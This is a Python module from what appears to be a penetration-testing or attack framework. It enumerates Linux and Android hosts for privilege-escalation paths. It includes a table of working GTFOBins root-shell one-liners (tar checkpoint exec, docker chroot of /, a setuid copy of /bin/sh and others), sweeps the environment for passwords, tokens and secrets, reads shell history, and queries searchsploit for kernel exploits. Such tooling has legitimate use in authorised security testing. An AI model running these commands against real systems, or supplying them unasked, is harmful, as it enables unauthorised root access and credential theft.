# -*- coding: utf-8 -*-
"""Privilege escalation enumeration (Linux/Android)."""
import os
import re

from ..core import netutil as nu
from ._base import MODULES, mod

GTFO = {"awk": "awk 'BEGIN {system(\"/bin/sh\")}'",
        "find": "find . -exec /bin/sh \\; -quit",
        "vim": "vim -c ':!/bin/sh'",
        "nmap": "nmap --interactive  (lalu !sh)",
        "less": "less /etc/passwd  (lalu !sh)",
        "python3": "python3 -c 'import os;os.system(\"/bin/sh\")'",
        "perl": "perl -e 'exec \"/bin/sh\";'",
        "tar": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
        "docker": "docker run -v /:/mnt -it alpine chroot /mnt sh",
        "cp": "cp /bin/sh /tmp/sh && chmod +s /tmp/sh"}


def _run(ctx, label, cmd, timeout=40):
    rc, out, err = ctx.exec(cmd, timeout)
    body = (out or err).strip()
    ctx.out(f"\n[{label}]\n{body[:1500] or '  -'}")
    return body


@mod(name="privesc.linux", category="privesc", desc="Enumerasi lokal Linux lengkap", offline=True)
def linux_enum(ctx):
    ctx.out(f"  uid={os.getuid()} euid={os.geteuid()} user={os.environ.get('USER','?')}")
    ctx.out(f"  root helper: tsu={nu.have('tsu')} sudo={nu.have('sudo')}")
    checks = [("kernel", "uname -a"), ("os-release", "cat /etc/os-release 2>/dev/null | head -5"),
              ("suid", "find / -perm -4000 -type f 2>/dev/null | head -40"),
              ("writable-dir", "for d in /tmp /dev/shm /var/tmp; do [ -w $d ] && echo WRITABLE $d; done"),
              ("cron", "ls -la /etc/cron* 2>/dev/null | head -30"),
              ("sudo-l", "sudo -n -l 2>/dev/null"),
              ("env", "env | grep -iE 'pass|token|key|secret'"),
              ("history", "cat ~/.bash_history 2>/dev/null | tail -30"),
              ("listen", "ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null")]
    for label, cmd in checks:
        body = _run(ctx, label, cmd)
        if label == "suid" and body:
            for line in body.splitlines():
                name = line.split("/")[-1]
                if name in GTFO:
                    ctx.finding(f"SUID GTFOBins: {name}", "high", line, GTFO[name])
        if label == "sudo-l" and "NOPASSWD" in body:
            ctx.finding("sudo NOPASSWD", "high", body[:500])
    return "enumerasi selesai"


@mod(name="privesc.suid", category="privesc", desc="Daftar file SUID/SGID", offline=True)
def suid(ctx):
    body = _run(ctx, "suid", "find / -perm -4000 -o -perm -2000 -type f 2>/dev/null | head -60", 90)
    for line in body.splitlines():
        ctx.finding("SUID/SGID", "medium", line)
    return f"{len(body.splitlines())} file"


@mod(name="privesc.caps", category="privesc", desc="Cek file capabilities", offline=True)
def caps(ctx):
    body = _run(ctx, "capabilities", "getcap -r / 2>/dev/null | head -40", 90)
    for line in body.splitlines():
        ctx.finding("capability file", "medium", line)
    return "caps selesai"


@mod(name="privesc.cron", category="privesc", desc="Cek cron writable / skrip", offline=True)
def cron(ctx):
    body = _run(ctx, "cron", "ls -la /etc/cron.d /etc/cron.daily /etc/cron.hourly 2>/dev/null; "
                             "cat /etc/crontab 2>/dev/null")
    for line in body.splitlines():
        if "rw" in line[:12] and line.split()[-1:] and "/" in line:
            ctx.finding("skrip cron", "info", line)
    return "cron selesai"


@mod(name="privesc.docker", category="privesc", desc="Deteksi docker / socket terbuka", offline=True)
def docker(ctx):
    body = _run(ctx, "docker", "ls -la /var/run/docker.sock 2>/dev/null; docker ps 2>/dev/null | head")
    if "docker.sock" in body:
        ctx.finding("docker socket ada", "high", body[:300], GTFO["docker"])
    return "docker selesai"


@mod(name="privesc.gtfobins", category="privesc", desc="Cari GTFOBins yang tersedia", offline=True)
def gtfobins(ctx):
    for b, exploit in GTFO.items():
        if nu.have(b):
            ctx.out(f"  {b}: {exploit}")
            ctx.finding(f"GTFOBins {b}", "info", exploit)
    return "gtfobins selesai"


@mod(name="privesc.android", category="privesc", desc="Enumerasi properti Android", offline=True)
def android(ctx):
    props = ["ro.debuggable", "ro.build.tags", "ro.build.version.release", "ro.product.cpu.abi",
             "ro.secure", "ro.boot.verifiedbootstate", "ro.build.type", "ro.product.model"]
    for p in props:
        rc, out, _ = ctx.exec(["getprop", p], 10)
        ctx.out(f"  {p} = {out.strip() or '-'}")
    dbg = ctx.exec(["getprop", "ro.debuggable"], 10)[1].strip()
    tags = ctx.exec(["getprop", "ro.build.tags"], 10)[1].strip()
    if dbg == "1" and "test-keys" in tags:
        ctx.finding("jalur root potensial", "high", f"debuggable={dbg} tags={tags}")
    pk = ctx.exec(["pm", "list", "packages"], 20)[1]
    ctx.out(f"  paket terpasang: {len(pk.splitlines())}")
    return "android selesai"


@mod(name="privesc.kernel", category="privesc", desc="Cari exploit kernel via versi", offline=True)
def kernel(ctx):
    rc, out, _ = ctx.exec(["uname", "-r"], 10)
    ver = out.strip()
    ctx.out(f"  kernel: {ver}")
    major_minor = ".".join(ver.split(".")[:2])
    ctx.finding("versi kernel", "info", ver)
    if nu.have("searchsploit"):
        rc, o, _ = ctx.exec(["searchsploit", "linux kernel " + major_minor], 60)
        ctx.out(o[:3000])
        for line in o.splitlines():
            if "|" in line and "EDB-ID" not in line:
                ctx.finding("kernel exploit", "high", line.split("|")[0].strip())
    return ver
